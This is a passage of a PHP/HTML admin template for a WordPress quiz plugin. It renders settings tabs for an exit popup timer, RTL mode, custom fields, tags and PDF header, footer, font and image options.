								if(isset($exit_popup_timer) && $exit_popup_timer != ''){
									$exit_popup_val = $exit_popup_timer;
								}else{
									$exit_popup_val = '5';
								} ?>

					 <div class="quiz-card-outer-gray">
							<div class="quiz-content-card exit-popup-right">
								<label for="" class="quiz_label">Exit Popup Timer for Mobile <small style="width: 100%; float: left; font-size: 13px;  padding-bottom: 6px;">Exit content functionality tracks mouse movement to figure out an intent to exit. It'll not work on mobile devices as there is no mouse movement. SQB uses a smarter way to track users abandoning your site on mobile devices. For e.g. if you set the timer to say 5 seconds, then after 5 seconds, it'll automatically display the configured popup.</small></label>
								<div class="quiz_right-content">
									<input type="number" name="exit_popup_timer" class="popup-timer" value="<?php echo $exit_popup_val; ?>">
									<div class="exit-popup-action">
										<a class="exit-popup-btn" href="javascript:void(0)">Update</a>
									</div>
									<p>(In seconds)</p>
								</div>
							</div>
					 </div>

					 <div class="quiz-card-outer-gray">
							<div class="quiz-content-card">
								<?php $sqb_rtl_mode = get_option('sqb_rtl_mode'); 
								$sqb_rtl_mode_checked = "";
								if(isset($sqb_rtl_mode) && $sqb_rtl_mode == 'Y'){
								$sqb_rtl_mode_checked = "checked='checked'";
								}
								?>
								<label for="" class="quiz_label">Do you want to enable RTL? <small style="width: 100%; float: left; font-size: 13px;  padding-bottom: 6px;">By default, SQB will take default language of WordPress.</small></label>
								<div class="quiz_right-content">
									<div class="square-switch_onoff">
										<input class="checkbox" name="sqb_rtl_mode" type="checkbox" id="sqb_rtl_mode" value="N" <?php echo $sqb_rtl_mode_checked; ?>>
										<label for="sqb_rtl_mode"></label>
									</div>
								</div>
							</div>
					 </div>
					 <div class="quiz-card-outer-gray">
							<div class="quiz-content-card">
								
								<label for="" class="quiz_label">Repair Tables <small style="width: 100%; float: left; font-size: 13px;  padding-bottom: 6px;">If you have any issues saving your quiz, click on the button below and try again.</small></label>
								<div class="quiz_right-content">
									<a href="javascript:void(0)" class="sqb-repair">Click to Repair</a>
								</div>

								<div class="repaired-message" style="display: none;">
									Repaired Successfully
								</div>
							</div>
					 </div>
				</div>		
			</div>		
			<div class="tab-pane  fade  <?php if(isset($_GET['inner_tab']) && ($_GET['inner_tab'] == 'custom_field')){ echo ' show active'; }?>" id="Quiz_setting_tab_4" role="tabpanel" aria-labelledby="Quiz_setting_tab_4">
				 <div class="Restriction-Settings-content">
								<div class="Restriction-Settings-leftside">
									<h3>Select Custom Field</h3>
									<ul name="customFieldsList" class="Quiz-customfields-list nav nav-tabs customFieldsList">
										<?php
											$i = 0;
											//get quiz data
											$custom_fields_obj = SQB_CustomFields::load();									 
											if(isset($custom_fields_obj)){
												 foreach($custom_fields_obj as $custom_fields_obj_row) {
													$custom_fields_id = $custom_fields_obj_row->id;
													$custom_fields_name = $custom_fields_obj_row->name;
													$custom_fields_label = $custom_fields_obj_row->label;
													$custom_fields_description = $custom_fields_obj_row->description;
													$custom_fields_field_type = $custom_fields_obj_row->field_type;
													$custom_fields_field_value = $custom_fields_obj_row->field_value;
													$custom_fields_showonlytoadmin = $custom_fields_obj_row->showonlytoadmin;
													$custom_fields_required = $custom_fields_obj_row->required;
													$custom_selected_country = $custom_fields_obj_row->selected_country;
											?>
										<li data-id="<?php echo $custom_fields_id; ?>" data-name="<?php echo $custom_fields_name; ?>" data-label="<?php echo $custom_fields_label; ?>" data-desc="<?php echo $custom_fields_description; ?>" data-field-type="<?php echo $custom_fields_field_type; ?>" data-field-value="<?php echo $custom_fields_field_value; ?>" data-showonlytoadmin="<?php echo $custom_fields_showonlytoadmin; ?>" data-required="<?php echo $custom_fields_required; ?>" data-selected-country="<?php echo $custom_selected_country; ?>" class=" nav-item sqb_custom_field_list_item" title="<?php echo $custom_fields_name; ?>">
											<a class=" nav-link" href="javascript:void(0);"><?php echo $custom_fields_name; ?></a>
										</li>	
										<?php $i++; }
										} ?>							 
									  
									</ul>
								</div>
								
								<div class="quiz-card-outer-gray box-right-side-custom-field">	
										<div class="d-flex justify-content-between mb-4">
											<h5 class="quiz--sub-title m-0 p-0">Add Custom Fields</h5>
											<span class="add-custom-field"><i class="fa fa-plus" aria-hidden="true"></i> Create New Custom Field</span>
										</div>
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Field Name 
												<!-- <div class="tool-tip">
												<i class="fa fa-info-circle" aria-hidden="true"></i>
												<div class="toll-tip-desc" style="max-width:400px;"><strong>Allowed characters:</strong><br> 
												Hyphens<br>
												Underscore<br>
												Lowercase Characters<br>
												Numbers<br>
												 <br>
												<strong>Not allowed:</strong><br>
												Spaces<br>
												Slash<br>
												Any Special character</div>
												</div> -->
											</label>
											<div class="quiz_right-content">				
												<input type="text" name="keyname" id="keyname" value="">
												<input type="hidden" name="keyname_valid" >
											</div>
											<input type="hidden" name="custom_field_id" id="custom_field_id" value="">
											<p class="mt-2 mb-0">This is just for the database use. Not displayed to the users. </br>Allowed characters: hyphens, underscore, lowercase, numbers.</p>
										</div>
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Label
												<div class="tool-tip">
												<i class="fa fa-info-circle" aria-hidden="true"></i>
												<div class="toll-tip-desc" style="max-width:400px;">will appear on User-Facing Pages</div>
												</div>
											</label>
											<div class="quiz_right-content">				
												<input type="text" name="keylabel" id="keylabel" value="">
											</div>
										</div>
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Description</label>
											<div class="quiz_right-content">				
												<input type="text" name="description" id="description" value="">
											</div>
										</div>
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Field Type</label>
											<div class="quiz_right-content">
												<select name="field_type" id="field_type"> 
													<option selected="" value="input">Textbox</option>
													<option value="textarea">Textarea</option>
													<option value="dropdown">Dropdown</option>
													<option value="checkbox">Checkbox</option>
													<option value="radio">Radio</option>
													<option value="phone_number">Phone Number</option>
													<option value="date">Date</option>
													<option value="hidden">Hidden</option>
												</select>				
											</div>
										</div>
										<div class="quiz-content-card select-country-outer" style="display:none;">
											<input type="hidden" name="cf_selected_country" id="cf_selected_country" value="us">
											<label for="" class="quiz_label">Select country</label>
											<div class="quiz_right-content cf-select-country-outer">
												<input name="select_country" class="cf-select-country">
											</div>
										</div>
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Field Values
												<div class="tool-tip">
												<i class="fa fa-info-circle" aria-hidden="true"></i>
												<div class="toll-tip-desc" style="max-width:400px;">Use comma separated values for dropdown, checkboxes and radio button</div>
												</div>
											</label>
											<div class="quiz_right-content">
												<textarea class="form-control" name="field_value" type="text" id="field_value" cols="10" rows="5"></textarea>				
											</div>
										</div>
										<!--<div class="quiz-content-card">
											<label for="" class="quiz_label">Show Field Only To Admin?
												<div class="tool-tip">
												<i class="fa fa-info-circle" aria-hidden="true"></i>
												<div class="toll-tip-desc" style="max-width:400px;">will appear on User-Facing Pages</div>
												</div>
											</label>
											<div class="quiz_right-content">				
												<select name="showonlytoadmin" id="showonlytoadmin"> 
													<option selected="" value="N">N</option>
													<option value="Y">Y</option>
												</select>
											</div>
										</div>-->

										<div class="quiz-content-card sqb-dropdown-field-outer" style="display:none;">
											<label for="" class="quiz_label">First Option as Default Placeholder in Dropdown
											</label>
											<div class="quiz_right-content">				
												<select name="dropdown_value" id="dropdown_value"> 
													<option selected="" value="N">N</option>
													<option value="Y">Y</option>
												</select>
											</div>
										</div>

										<div class="quiz-content-card">
											<label for="" class="quiz_label">Required Field?
												<div class="tool-tip">
												<i class="fa fa-info-circle" aria-hidden="true"></i>
												<div class="toll-tip-desc" style="max-width:400px;">will force filling this field when it appears on the User Profile page - the only page that this restriction applies to</div>
												</div>
											</label>
											<div class="quiz_right-content">				
												<select name="required" id="required"> 
													<option selected="" value="N">N</option>
													<option value="Y">Y</option>
												</select>
											</div>
										</div>
										<div class="quiz-content-card">
											<!--<div class="shortcode_details validation_message" style="display:none;">Some problem is there</div>-->
											<div class="custom_fields_msg sucess_message" style="display:none;">Saved successfully.</div>
											<div class="quiz-actions justify-content-center">
												<a href="javascript:void(0)" class="quiz--btn quiz-save-btn sqb_save_custom_fields"> Save </a>
											</div>
										</div>
										
										<div class="quiz-content-card mt-4">
											<div class="d-flex justify-content-between align-items-center mb-2">
												<h5 class="quiz--sub-title p-0"> Manage Custom Fields</h5>
												<span class="addCustomFieldsLink" style="">Create New Custom Field</span>
											</div>
											<div class="custom_fields_table"></div>
										</div>
								</div>
							</div>
					 		<div class="question_error_msg_outer quiz-save-setting-error" style="display: none;">
								<div class="question_error_msg">Please NOTE: Can't use Randomize Question in a calculator because if users take a different path, some of the formulas won't work.
								</div>
							</div>
							 
			</div>
			<div class="tab-pane  fade <?php if(isset($_GET['inner_tab']) && ($_GET['inner_tab'] == 'tags_tab')){ echo ' show active'; } ?>" id="Quiz_setting_tab_5" role="tabpanel" aria-labelledby="Quiz_setting_tab_5">
				<div class="Restriction-Settings-content">
								<div class="Restriction-Settings-leftside">
									<h3>Select a Tag</h3>
									<input type="text" name="sqb_search_tag_names" id="sqb_search_tag_names" value="" style="max-width: 100%;" placeholder="Search Name">
									<ul name="quizTagList" class="Quiz-Restriction-list nav nav-tabs quizTagList">
										<?php
											$i = 0;
											//get tag data
											$sqb_tags_obj = SQB_Tags::load();
											if(isset($sqb_tags_obj) && !empty($sqb_tags_obj)) {
											$i = 1;
											foreach($sqb_tags_obj as $sqb_tags){
											$sqb_tags_id = $sqb_tags->id;
											$sqb_tags_name = stripslashes($sqb_tags->name);
											$sqb_tags_content = $sqb_tags->tag_content;
											?>
											<li data-id="<?php echo $sqb_tags_id; ?>" data-name="<?php echo $sqb_tags_name; ?>" data-content="" class=" nav-item sqb_tag_item" title="<?php echo $sqb_tags_name; ?>">
												<a class=" nav-link" href="javascript:void(0);"><?php echo $sqb_tags_name; ?></a>
											</li>	
											<?php $i++; }
											} ?>							 
									</ul>
								</div>

								<div class="quiz-card-outer-gray">	
										<div class="d-flex justify-content-between mb-4">
											<h5 class="quiz--sub-title m-0 p-0">Add Tag</h5>
											<span class="delete-tag-content"><i class="fa fa-plus" aria-hidden="true"></i> Delete Tag</span>
											<span class="add-tag-content"><i class="fa fa-plus" aria-hidden="true"></i> Create New Tag</span>
										</div>
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Tag Name 
											</label>
											<div class="quiz_right-content">				
												<input type="text" name="tagname" id="tagname" value="">
												<input type="hidden" name="tagname_valid" >
											</div>
											<input type="hidden" name="tag_field_id" id="tag_field_id" value="">
										</div>
										
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Tag Content</label>
											<div class="Quiz-Template-content tags_content_temp_outer">
												<div class="tags_content_temp" style="text-align: center;">
													<div class="sqb_tag_content">
														<div class="tags_content_heading sqb_tiny_mce_editor"><div>Heading goes here</div></div>
														<div class="tags_content_desc sqb_tiny_mce_editor"><div>Please enter tag description here</div></div>
													</div>
												</div>
											</div>
										</div>
										
										<div class="quiz-content-card">
											<div class="sqb_tags_msg sucess_message" style="display:none;">Saved successfully.</div>
											<div class="quiz-actions justify-content-center">
												<a href="javascript:void(0)" class="quiz--btn quiz-save-btn sqb_save_tag_content"> Save </a>
											</div>
										</div>
										
								</div>
							</div>
					 		<div class="question_error_msg_outer quiz-save-setting-error" style="display: none;">
								<div class="question_error_msg">Please NOTE: Can't use Randomize Question in a calculator because if users take a different path, some of the formulas won't work.
								</div>
							</div>
			</div><!----- tags content section------>

			<div class="tab-pane  fade  " id="Quiz_setting_tab_6" role="tabpanel" aria-labelledby="Quiz_setting_tab_6">		
				<?php 
					$pdf_display_option_val  = "same";
					$pdf_global_font_val = 'sans-serif';
					$header_background_val = '#f1f1f1';
					$footer_background_val = '#f1f1f1';
					$footer_copyright_val = '<span style="font-size: 12pt;color:#171717;" data-mce-style="font-size: 12pt;"><strong>%%DOMAIN%% ©%%YEAR%% All Rights Reserved</strong></span>';
					$header_title_val = '<span style="font-size: 12pt;color:#171717;" data-mce-style="font-size: 12pt;"><strong>%%HEADERTITLE%%</strong></span>';
					$add_pdf_icon_val = '';
					
					$firstpage_width_val = '400';
					$first_page_align_val = 'center';
					$first_page_horizontal_val = 'center';
					$lastpage_width_val = '400';
					$last_page_align_val = 'center';
					$last_page_horizontal_val = 'center';

					$upload_first_image_option_checked = '';
					$upload_first_image_option_value = 'display:none';

					$header_background_color = sqbGetValidSettingsByKey('pdf_header_background_color');
					if(isset($header_background_color) && $header_background_color != ''){
						$header_background_val = $header_background_color;
					} 

					$pdf_global_font = sqbGetValidSettingsByKey('pdf_global_font');
					if(isset($pdf_global_font) && $pdf_global_font != ''){
						$pdf_global_font_val = $pdf_global_font;
					} 

					$supported_font = array(
										'sans-serif' => 'Sans Seirif',
										'roboto' => 'Roboto',
										//'times' => 'Times',
										'times-roman' => 'Times Roman',
										'courier' => 'courier',
										//'zapfdingbats' => 'Zapfdingbats',
										//'symbol' => 'symbol',
										//'monospace' => 'monospace',
										'dejavu sans' => 'dejavu sans',
										//'dejavu sans condensed' => 'dejavu sans condensed',
										'dejavu sans mono' => 'dejavu sans mono',
										'dejavu serif' => 'dejavu serif',
										'DejaVu Sans, sans-serif' => 'DejaVu Sans, sans-serif',
										'BeVietnamPro, sans-serif' => 'BeVietnamPro',
										
										//'dejavu serif condensed' => 'dejavu serif condensed',
									);
					$plugin_path = 'gdprlibrary/gdprlibrary.php';

					if (is_plugin_active($plugin_path)) {
					    $supported_font['mgenplus'] = 'Mgen+ (Japanese font)';
					} 
					

					$footer_background_color = sqbGetValidSettingsByKey('pdf_footer_background_color');
					if(isset($footer_background_color) && $footer_background_color != ''){
						$footer_background_val = $footer_background_color;
					} 
					$footer_copyright_content = sqbGetValidSettingsByKey('pdf_footer_copyright_content');
					if(isset($footer_copyright_content) && $footer_copyright_content != ''){
						$footer_copyright_val = stripslashes($footer_copyright_content);
					} 
					$header_title = sqbGetValidSettingsByKey('pdf_header_title');
					if(isset($header_title) && $header_title != ''){
						$header_title_val = stripslashes($header_title);
					} 

					$add_pdf_icon = sqbGetValidSettingsByKey('add_pdf_icon');
					if(isset($add_pdf_icon) && $add_pdf_icon != ''){
						$add_pdf_icon_val = $add_pdf_icon;
					} 

					$first_page_image = sqbGetValidSettingsByKey('first_page_image');
					if(isset($first_page_image) && $first_page_image != ''){
						$first_page_image_val = $first_page_image;
					} 

					$firstpage_width = sqbGetValidSettingsByKey('firstpage_width');
					if(isset($firstpage_width) && $firstpage_width != ''){
						$firstpage_width_val = $firstpage_width;
					} 

					$first_page_align = sqbGetValidSettingsByKey('first_page_align');
					if(isset($first_page_align) && $first_page_align != ''){
						$first_page_align_val = $first_page_align;
					} 

					$first_page_horizontal = sqbGetValidSettingsByKey('first_page_horizontal');
					if(isset($first_page_horizontal) && $first_page_horizontal != ''){
						$first_page_horizontal_val = $first_page_horizontal;
					} 

					$lastpage_width = sqbGetValidSettingsByKey('lastpage_width');
					if(isset($lastpage_width) && $lastpage_width != ''){
						$lastpage_width_val = $lastpage_width;
					} 

					$last_page_align = sqbGetValidSettingsByKey('last_page_align');
					if(isset($last_page_align) && $last_page_align != ''){
						$last_page_align_val = $last_page_align;
					} 

					$last_page_horizontal = sqbGetValidSettingsByKey('last_page_horizontal');
					if(isset($last_page_horizontal) && $last_page_horizontal != ''){
						$last_page_horizontal_val = $last_page_horizontal;
					} 

					$last_page_image = sqbGetValidSettingsByKey('last_page_image');
					if(isset($last_page_image) && $last_page_image != ''){
						$last_page_image_val = $last_page_image;
					}

					$upload_first_image_option = sqbGetValidSettingsByKey('upload_first_image_option');
					if(isset($upload_first_image_option) && $upload_first_image_option != ''){
						$upload_first_image_option_val = $upload_first_image_option;
						if($upload_first_image_option_val == 'Y'){
							$upload_first_image_option_value = 'display:block';
							$upload_first_image_option_checked = 'checked="checked"';
						}
					} 

					$pdf_display_option = sqbGetValidSettingsByKey('pdf_display_option');
					if(isset($pdf_display_option) && $pdf_display_option != ''){
						$pdf_display_option_val = $pdf_display_option;
					}

				?>

				<?php if(defined('SQB_PD_FILE')){ ?>

				<div class="quiz-card-outer-gray pdf_settings_outer" > 
					<div class="quiz-content-card pdf-section">
						<div class="main-heading">
							<label>You can get SQB to automatically generate a PDF report.</label>
							<p>1. Configure the PDF opion in the display settings tab of your quiz.</br>
							2. Use the PDF shortcode on your outcome screen</p>
						</div>

						
						<ul class="nav nav-tabs global-settings-tab" id="Quiz_pdf_setting_tab" role="tablist">


							<li class="nav-item">
								<a class="nav-link active show" data-toggle="tab" href="#Quiz_pdf_setting_tab_1" role="tab" aria-controls="Quiz_pdf_setting_tab_1" aria-selected="false">Header/Footer Settings</a>
							</li>
							
							
							<li class="nav-item">
								<a class="nav-link" data-toggle="tab" href="#Quiz_pdf_setting_tab_2" role="tab" aria-controls="Quiz_pdf_setting_tab_2" aria-selected="true">Standard PDF</a>
							</li>
							
							
						</ul>

						<div class="tab-content" id="Quiz_pdf_setting_tab_content">
							<div class="tab-pane fade active show" id="Quiz_pdf_setting_tab_1" role="tabpanel" aria-labelledby="Quiz_pdf_setting_tab_1">	
								<div class="background-color-section">
									<h5 class="quiz--sub-title" style="font-size:18px; ">Background Color</h5>
									<div class="inline-pdf-content">
										<div class="pdf-content">
											<label style="font-size: 16px; margin-bottom: 0px;">Header:</label>
											<div id="header_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
												<input type="text" value="<?php echo $header_background_val; ?>" name="header_background_color">
												<span class="input-group-addon"><i style="background-color: <?php echo $header_background_val; ?>;"></i></span>
											</div>
										</div>
										<div class="pdf-content">
											<label style="font-size: 16px; margin-bottom: 0px;">Footer:</label>
											<div id="footer_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
												<input type="text" value="<?php echo $footer_background_val; ?>" name="footer_background_color">
												<span class="input-group-addon"><i style="background-color: <?php echo $footer_background_val; ?>;"></i></span>
											</div>
										</div>
									</div>
								</div>
								<div class="pdf-content pdf-border-bottom pdf-all-outer">
									<label>Logo Image:</label>
									<p>It'll be displayed in the header</p>
									<div class="browse-pdf-btn-wrapper" style="<?php if($add_pdf_icon_val){ echo 'display: none;'; }else{ echo 'display: block;'; } ?>">
										<button class="add_pdf_icon browse-pdf-icon">Click to Upload Image</button>
									</div>
									<div class="pdf-image-section" style="<?php if($add_pdf_icon_val){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
										<span class="close-page-image delete-pdf-logo-image">X</span>
										<img class="pdf-browse-img" src="<?php echo $add_pdf_icon_val; ?>">
										<input type="hidden" name="add_pdf_icon" class="popup-timer" value="<?php echo $add_pdf_icon_val; ?>">
									</div>
								</div>

								<div class="background-color-section settings-remove-border-bottom">
							
									<div class="">
										<label for="" class="quiz_global_font">Global PDF Font family</label>
										<p>These are the only fonts supported by the PDF library</p>
										<div class="quiz_right-content">
											<select name="pdf_global_font" id="pdf_global_font"> 
												<?php foreach ($supported_font as $key => $fontlist) {
													$sf_selected = ($pdf_global_font_val == $key) ? 'selected' : '';
												 ?>
													<option value="<?php echo $key ?>" <?php echo $sf_selected ?>><?php echo $fontlist ?></option>
												<?php } ?>
											</select>				
										</div>
									</div>
								</div>
								<div class="pdf-content">
									<label>Enter Footer Copyright Content</label>
									<div class="sqb_tiny_mce_editor footer_copyright_content content-text-editor" id="mce_65" contenteditable="true" spellcheck="false" style="position: relative;"><?php echo $footer_copyright_val; ?></div>
								</div>
								<div class="pdf-content">
									<label>Enter Header Title:</label>
									<div class="sqb_tiny_mce_editor header_title content-text-editor" id="mce_66" contenteditable="true" spellcheck="false" style="position: relative;"><?php echo $header_title_val; ?></div>
								</div>
								<div class="pdf-content pdf_buttons">
									<a href="javascript:void(0)" class="preview-header-btn preview_btn">Preview Header</a>
									<a href="javascript:void(0)" class="preview-footer-btn preview_btn" >Preview Footer</a>
								</div>



							</div>

							<div class="tab-pane" id="Quiz_pdf_setting_tab_2" role="tabpanel" aria-labelledby="Quiz_pdf_setting_tab_2">	
								<div class="standard-title-outer">
									<p>Please NOTE:	You only need to do this if you are using the standard PDF editor.
										If you are using the advanced editor, you can set up the PDF <a href="<?php echo home_url(); ?>/wp-admin/admin.php?page=sqb_pdf_content">here</a>. 
									</p>
								</div>

								<div class="pdf-content pdf-border-bottom">
							<label>First and Last Page Image (optional) <small style=" float: left; width: 100%; color: #555; font-size: 13px;">This will displayed on the first and last page of your PDF</small></label>							
							
							

							<div class="quiz_right-content mt-3">
								<span style=" width: 100%; float: left;"> 
							Do you want to upload an image for the start page of your PDF?</span>
								<div class="square-switch_onoff">
									<input class="checkbox" name="upload_first_image_option" type="checkbox" id="upload_first_image_option" value="Y" <?php echo $upload_first_image_option_checked; ?>>
									<label for="upload_first_image_option"></label> 
								</div>
							</div>

							<div class="quiz_right-content pdf-display-options mt-3" style="<?php echo $upload_first_image_option_value; ?>">
								<span>Do you want to use same image for all quizzes or different ones for each? </span>
								<label class="radio-btn--outer" style="font-weight: 400;"><input type="radio" name="pdf_display_option" value="same" <?php if($pdf_display_option_val == 'same'){ echo 'checked=""';} ?>>Same image for all quizzes </label>
								<label class="radio-btn--outer" style="font-weight: 400;"><input type="radio" name="pdf_display_option" value="different" <?php if($pdf_display_option_val == 'different'){ echo 'checked=""';} ?>>Different images for different quizzes</label>

								<div class="all-first-image" style="<?php if($pdf_display_option_val == 'same'){ echo 'display:block;'; }else{ echo 'display:none;'; } ?>">
									<div class="pdf-customizer-screen-wrapper">
										<div class="first-page-image first-page-class">
											<label>First Page Image</label>

											<div class="browse-pdf-btn-wrapper" style="<?php if($first_page_image){ echo 'display: none;'; }else{ echo 'display: block;'; } ?>">
												<button class="first_page_image browse-pdf-icon">Click to Upload Image</button>
											</div>
											<div class="pdf-image-section" style="<?php if($first_page_image){ echo 'display: inline-block;'; }else{ echo 'display: none;'; } ?>">
												<img class="pdf-first-img pdf-browse-img" src="<?php echo $first_page_image; ?>">
												<span class="close-page-image delete-all-first-image">X</span>
												<input type="hidden" name="first_page_image" class="popup-timer" value="<?php echo $first_page_image; ?>">
											</div>
										</div>
										<div class="section-right-pdf-img-customizer">
											<div class="first-page-width">
												<label>Width</label>
												<p>
													<input id="firstpage_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="100" data-slider-max="1000" data-slider-step="1" data-slider-value="<?php echo $firstpage_width_val; ?>" />
												</p>
											</div>

											<div class="first-page-align">
												<label>Vertical Align</label>
												<p><select id="first_page_align_style">
														<option value="center" <?php  if($first_page_align_val == 'center'){ echo 'selected=""';} ?>>Center</option>
														<option value="top" <?php  if($first_page_align_val == 'top'){ echo 'selected=""';} ?>>Top</option>
														<option value="bottom" <?php  if($first_page_align_val == 'bottom'){ echo 'selected=""';} ?>>Bottom</option>
													</select>
												</p>
											</div>

											<div class="first-horizontal-page-align">
												<label>Horizontal Align</label>
												<p><select id="first_horizontal_page_align_style">
														<option value="center" <?php  if($first_page_horizontal_val == 'center'){ echo 'selected=""';} ?>>Center</option>
														<option value="left" <?php  if($first_page_horizontal_val == 'left'){ echo 'selected=""';} ?>>Left</option>
														<option value="right" <?php  if($first_page_horizontal_val == 'right'){ echo 'selected=""';} ?>>Right</option>
													</select>
												</p>
											</div>
										</div>
									</div>

									<div class="pdf-customizer-screen-wrapper mt-3">
										<div class="last-page-image">
											<label>Last Page Image</label>
											<div class="browse-pdf-btn-wrapper" style="<?php if($last_page_image){ echo 'display: none;'; }else{ echo 'display: block;'; } ?>">
												<button class="last_page_image browse-pdf-icon">Click to Upload Image</button>
											</div>
											
											<div class="pdf-image-section" style="<?php if($last_page_image){ echo 'display: inline-block;'; }else{ echo 'display: none;'; } ?>">
												<img class="pdf-last-img pdf-browse-img" src="<?php echo $last_page_image; ?>">
												<span class="close-page-image delete-all-last-image">X</span>
												<input type="hidden" name="last_page_image" class="popup-timer" value="<?php echo $last_page_image; ?>">
											</div>
										</div>
										<div class="section-right-pdf-img-customizer">
											<div class="last-page-width">
												<label>Width</label>
												<p>
													<input id="lastpage_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="100" data-slider-max="1000" data-slider-step="1" data-slider-value="<?php echo $lastpage_width_val ?>" />
												</p>
											</div>

											<div class="last-page-align">
												<label>Vertical Align</label>
												<p><select id="last_page_align_style">
														<option value="center" <?php  if($last_page_align_val == 'center'){ echo 'selected=""';} ?>>Center</option>
														<option value="top" <?php  if($last_page_align_val == 'top'){ echo 'selected=""';} ?>>Top</option>
														<option value="bottom" <?php  if($last_page_align_val == 'bottom'){ echo 'selected=""';} ?>>Bottom</option>
													</select>
												</p>
											</div>

											<div class="last-horizontal-page-align">
												<label>Horizontal Align</label>
												<p><select id="last_horizontal_page_align_style">
														<option value="center" <?php  if($last_page_horizontal_val == 'center'){ echo 'selected=""';} ?>>Center</option>
														<option value="left" <?php  if($last_page_horizontal_val == 'left'){ echo 'selected=""';} ?>>Left</option>
														<option value="right" <?php  if($last_page_horizontal_val == 'right'){ echo 'selected=""';} ?>>Right</option>
													</select>
												</p>
											</div>
										</div>
									</div>
								</div>

								
								
								<div class="pdf-settings-content right-box-pdf" style="padding:0; margin-left:0;<?php if($pdf_display_option_val == 'different'){ echo 'display:flex;'; }else{ echo 'display:none;'; } ?>">
									<div class="pdf-settings-leftside">
										<input type="text" name="sqb_search_multiple_quiz_name_pdf" id="sqb_search_multiple_quiz_name_pdf" value="" style="max-width: 100%;" placeholder="Search URL">
										<ul name="pdf-quizList" class="Quiz-Restriction-list nav nav-tabs pdf-quizList">
											<?php
												$i = 0;
												//get quiz data
												$quizdata = SQB_Quiz::load();									 
												if(isset($quizdata)){
													 foreach($quizdata as $quiz_data_single_row) {
														$quiz_id = $quiz_data_single_row->getId(); 
														$quiz_type = $quiz_data_single_row->getQuizType(); 
														$quiz_name = $quiz_data_single_row->getQuizName(); 
												?>
											<li data-value="<?php echo $quiz_id; ?>" data-title="<?php echo stripslashes($quiz_name); ?>" data-type="<?php echo $quiz_type; ?>" class=" nav-item <?= isset($i) && $i == 0 ? 'activeli' : '' ?>" title="<?php echo stripslashes($quiz_name); ?>">
												<a class=" nav-link <?= isset($i) && $i == 0 ? 'active' : '' ?>" href="javascript:void(0);"><?php echo stripslashes($quiz_name).' (id: '.$quiz_id.')'; ?></a>
											</li>	
											<?php $i++; }
											} ?>							 
										  
										</ul>
									</div>
									<div class="pdf-settings-rightside">
										<div class="different-first-image" >
											<div class="first-page-image">
												<label>First Page Image</label>
												<div class="browse-pdf-btn-wrapper">
													<button class="different_first_page_image browse-pdf-icon">Click to Upload Image</button>
												</div>
												<div class="pdf-image-section" style="display:none;">
													<img class="different-pdf-first-img pdf-browse-img" src="">
													<span class="close-page-image delete-different-first-image">X</span>
													<input type="hidden" name="different_first_page_image" class="popup-timer" value="">
												</div>
											</div>
											<div class="section-right-pdf-img-customizer border-bottom-pff">
												<div class="quiz-first-page-width">
													<label>Width</label>
													<p>
														<input id="quiz_firstpage_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="100" data-slider-max="1000" data-slider-step="1" data-slider-value="450" />
													</p>
												</div>

												<div class="quiz-first-page-align">
													<label>Vertical Align</label>
													<p><select id="quiz_first_page_align_style">
															<option value="center" selected="">Center</option>
															<option value="top">Top</option>
															<option value="bottom">Bottom</option>
														</select>
													</p>
												</div>

												<div class="quiz-first-horizontal-page-align">
													<label>Horizontal Align</label>
													<p><select id="quiz_first_horizontal_page_align_style">
															<option value="center" selected="">Center</option>
															<option value="left">Left</option>
															<option value="right">Right</option>
														</select>
													</p>
												</div>
											</div>


											<div class="last-page-image">
												<label>Last Page Image</label>
												<div class="browse-pdf-btn-wrapper">
													<button class="different_last_page_image browse-pdf-icon">Click to Upload Image</button>
												</div>
												
												<div class="pdf-image-section" style="display:none;">
													<img class="different-pdf-last-img pdf-browse-img" src="">
													<span class="close-page-image delete-different-last-image">X</span>
													<input type="hidden" name="different_last_page_image" class="popup-timer" value="">
												</div>
											</div>
											<div class="section-right-pdf-img-customizer">
												<div class="quiz-last-page-width">
													<label>Width</label>
													<p>
														<input id="quiz_lastpage_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="100" data-slider-max="1000" data-slider-step="1" data-slider-value="450" />
													</p>
												</div>

												<div class="quiz-last-page-align">
													<label>Vertical Align</label>
													<p><select id="quiz_last_page_align_style">
															<option value="center" selected="">Center</option>
															<option value="top">Top</option>
															<option value="bottom">Bottom</option>
														</select>
													</p>
												</div>

												<div class="quiz-last-horizontal-page-align">
													<label>Horizontal Align</label>
													<p><select id="quiz_last_horizontal_page_align_style">
															<option value="center" selected="">Center</option>
															<option value="left">Left</option>
															<option value="right">Right</option>
														</select>
													</p>
												</div>
											</div>
										</div>
										<div class="quiz-content-card pdfsave-btn-outer">
											<div class="sqb_pdf_img_msg sucess_message" style="display:none;">Saved successfully.</div>
											<div class="quiz-actions justify-content-center">
												<a href="javascript:void(0)" class="quiz--btn save-pdf-images"> Save </a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
					<div class="preview-header-section" style="display: none;">
						<div class="logo-section"><img style="width: 80px;" src=""></div>
						<div class="header-title"></div>
						<div class="close-btn header-close">X</div>
					</div>
					<div class="preview-footer-section" style="display: none;">
						<div class="py-4">
					      <div class="container text-center">
					        <p class="text-muted mb-0 py-2 pdf-footer-text"></p>
					      </div>
					    </div>
						<div class="close-btn footer-close">X</div>

					</div>
					<div class="quiz-actions justify-content-center">
						<a href="javascript:void(0)" class="quiz--btn save-pdf-settings"> Save </a>
					</div>
			 	</div>
			 <?php }else{ ?>

				<div class="have-no-quiz">
	
					<h3>You need to download and activate "SQB PDF Download" plugin from your <a href="https://wickedcoolplugins.com/login" target="_blank">member's area</a> on our site to use this feature. </h3>
					
				</div>
			 <?php } ?>
			</div>
			<div class="sqb-global-email-customizer tab-pane fade" id="Quiz_setting_tab_8" role="tabpanel" aria-labelledby="Quiz_setting_tab_8">	
				<?php 
